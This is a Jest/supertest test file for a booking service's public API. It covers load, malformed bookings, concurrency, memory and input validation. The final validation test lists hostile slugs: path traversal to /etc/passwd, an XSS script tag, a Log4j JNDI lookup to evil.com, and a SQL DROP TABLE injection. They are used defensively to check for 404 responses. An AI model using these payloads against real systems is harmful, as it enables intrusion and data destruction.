import request from 'supertest';
import app from '../app';
import { prisma } from './setup';

describe('API Stability and Performance Tests', () => {
  let testMaster: any;
  let testService: any;

  beforeEach(async () => {
    // Создаем тестового мастера с множественными услугами
    testMaster = await prisma.user.create({
      data: {
        email: 'stability-test@example.com',
        passwordHash: 'hashed-password',
        name: 'Stability Test Master',
        slug: 'stability-test-master',
        description: 'Master for stability testing',
        address: 'Test Address',
        isActive: true,
        role: 'MASTER',
      },
    });

    // Создаем несколько услуг
    testService = await prisma.service.create({
      data: {
        masterId: testMaster.id,
        name: 'Main Service',
        price: 100.0,
        durationMin: 60,
        isActive: true,
      },
    });

    // Создаем дополнительные услуги
    for (let i = 1; i <= 5; i++) {
      await prisma.service.create({
        data: {
          masterId: testMaster.id,
          name: `Service ${i}`,
          price: 50.0 + i * 10,
          durationMin: 30 + i * 10,
          isActive: true,
        },
      });
    }
  });

  describe('Load Testing', () => {
    it('should handle high load on GET /public/:slug', async () => {
      const startTime = Date.now();
      const requestCount = 50;

      const requests = Array(requestCount)
        .fill(null)
        .map(() => request(app).get(`/api/public/${testMaster.slug}`));

      const responses = await Promise.all(requests);
      const endTime = Date.now();
      const duration = endTime - startTime;

      // Проверяем, что все запросы успешны
      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body.name).toBe(testMaster.name);
        expect(response.body.services).toHaveLength(6); // 1 основная + 5 дополнительных
      });

      // Проверяем производительность (должно быть быстрее 5 секунд)
      expect(duration).toBeLessThan(5000);
      console.log(
        `Load test completed in ${duration}ms for ${requestCount} requests`
      );
    });

    it('should handle rapid sequential requests', async () => {
      const requestCount = 20;
      const results = [];

      for (let i = 0; i < requestCount; i++) {
        const response = await request(app).get(
          `/api/public/${testMaster.slug}`
        );

        results.push({
          status: response.status,
          responseTime: response.headers['x-response-time'] || 'unknown',
        });
      }

      // Все запросы должны быть успешными
      results.forEach(result => {
        expect(result.status).toBe(200);
      });
    });
  });

  describe('Error Handling and Edge Cases', () => {
    it('should handle invalid slug formats', async () => {
      const invalidSlugs = [
        '',
        '   ',
        'slug-with-special-chars!@#',
        'slug with spaces',
        'very-long-slug-that-exceeds-normal-limits-and-might-cause-issues-with-database-queries-or-url-encoding',
      ];

      for (const slug of invalidSlugs) {
        const response = await request(app).get(
          `/api/public/${encodeURIComponent(slug)}`
        );

        // Должен возвращать 404 для несуществующих слогов
        expect([400, 404]).toContain(response.status);
      }
    });

    it('should handle malformed booking requests', async () => {
      const malformedRequests = [
        {}, // Пустой объект
        { name: 'Test' }, // Неполные данные
        { name: 'Test', phone: '123', serviceId: 'invalid' }, // Неверный serviceId
        {
          name: 'Test',
          phone: '+1234567890',
          serviceId: testService.id,
          startAt: 'invalid-date',
        }, // Неверная дата
        {
          name: 'Test',
          phone: '+1234567890',
          serviceId: testService.id,
          startAt: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
        }, // Прошедшая дата
      ];

      for (const requestData of malformedRequests) {
        const response = await request(app)
          .post(`/api/public/${testMaster.slug}/book`)
          .send(requestData);

        expect([400, 404]).toContain(response.status);
      }
    });

    it('should handle database connection issues gracefully', async () => {
      // Тестируем поведение при проблемах с базой данных
      const originalFindUnique = prisma.user.findUnique;

      // Мокаем ошибку базы данных
      jest
        .spyOn(prisma.user, 'findUnique')
        .mockRejectedValueOnce(new Error('Connection timeout'));

      const response = await request(app)
        .get(`/api/public/${testMaster.slug}`)
        .expect(500);

      expect(response.body).toHaveProperty('error', 'Server error');

      // Восстанавливаем оригинальный метод
      prisma.user.findUnique = originalFindUnique;
    });
  });

  describe('Data Consistency Tests', () => {
    it('should maintain data consistency during concurrent bookings', async () => {
      const baseTime = new Date(Date.now() + 24 * 60 * 60 * 1000);
      const bookingData = {
        name: 'Concurrent Client',
        phone: '+1234567890',
        serviceId: testService.id,
        startAt: baseTime.toISOString(),
      };

      // Создаем несколько одновременных запросов на одно и то же время
      const requests = Array(3)
        .fill(null)
        .map(() =>
          request(app)
            .post(`/api/public/${testMaster.slug}/book`)
            .send(bookingData)
        );

      const responses = await Promise.all(requests);

      // Только один запрос должен быть успешным
      const successfulResponses = responses.filter(r => r.status === 201);
      const conflictResponses = responses.filter(r => r.status === 409);

      expect(successfulResponses).toHaveLength(1);
      expect(conflictResponses).toHaveLength(2);
    });

    it('should handle timezone differences correctly', async () => {
      const utcTime = new Date(Date.now() + 24 * 60 * 60 * 1000);
      const localTime = new Date(utcTime.getTime() - 3 * 60 * 60 * 1000); // UTC-3

      const bookingData = {
        name: 'Timezone Test Client',
        phone: '+1234567890',
        serviceId: testService.id,
        startAt: localTime.toISOString(),
      };

      const response = await request(app)
        .post(`/api/public/${testMaster.slug}/book`)
        .send(bookingData)
        .expect(201);

      expect(response.body).toHaveProperty('id');
      expect(response.body.status).toBe('CONFIRMED');
    });
  });

  describe('Memory and Resource Management', () => {
    it('should not leak memory during repeated requests', async () => {
      const initialMemory = process.memoryUsage();

      // Выполняем множество запросов
      for (let i = 0; i < 100; i++) {
        await request(app).get(`/api/public/${testMaster.slug}`);
      }

      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;

      // Увеличение памяти не должно быть критическим (менее 50MB)
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
    });

    it('should handle large response payloads', async () => {
      // Создаем мастера с большим количеством услуг
      const largeMaster = await prisma.user.create({
        data: {
          email: 'large-master@example.com',
          passwordHash: 'hashed-password',
          name: 'Large Master',
          slug: 'large-master',
          description: 'Master with many services',
          isActive: true,
          role: 'MASTER',
        },
      });

      // Создаем 50 услуг
      for (let i = 0; i < 50; i++) {
        await prisma.service.create({
          data: {
            masterId: largeMaster.id,
            name: `Service ${i}`,
            price: 100.0,
            durationMin: 60,
            isActive: true,
          },
        });
      }

      const response = await request(app)
        .get(`/api/public/${largeMaster.slug}`)
        .expect(200);

      expect(response.body.services).toHaveLength(50);
      expect(response.body.name).toBe('Large Master');
    });
  });

  describe('API Rate Limiting and Security', () => {
    it('should handle rapid fire requests without crashing', async () => {
      const rapidRequests = Array(100)
        .fill(null)
        .map(() => request(app).get(`/api/public/${testMaster.slug}`));

      const responses = await Promise.all(rapidRequests);

      // Все запросы должны обработаться
      responses.forEach(response => {
        expect([200, 429]).toContain(response.status); // 429 если есть rate limiting
      });
    });

    it('should validate input parameters properly', async () => {
      const maliciousInputs = [
        { slug: '../../../etc/passwd' },
        { slug: '<script>alert("xss")</script>' },
        { slug: '${jndi:ldap://evil.com/a}' }, // Log4j style injection
        { slug: '; DROP TABLE users; --' }, // SQL injection attempt
      ];

      for (const input of maliciousInputs) {
        const response = await request(app).get(
          `/api/public/${encodeURIComponent(input.slug)}`
        );

        // Должен возвращать 404, а не ошибку сервера
        expect(response.status).toBe(404);
        expect(response.body).toHaveProperty('error', 'Profile not found');
      }
    });
  });
});
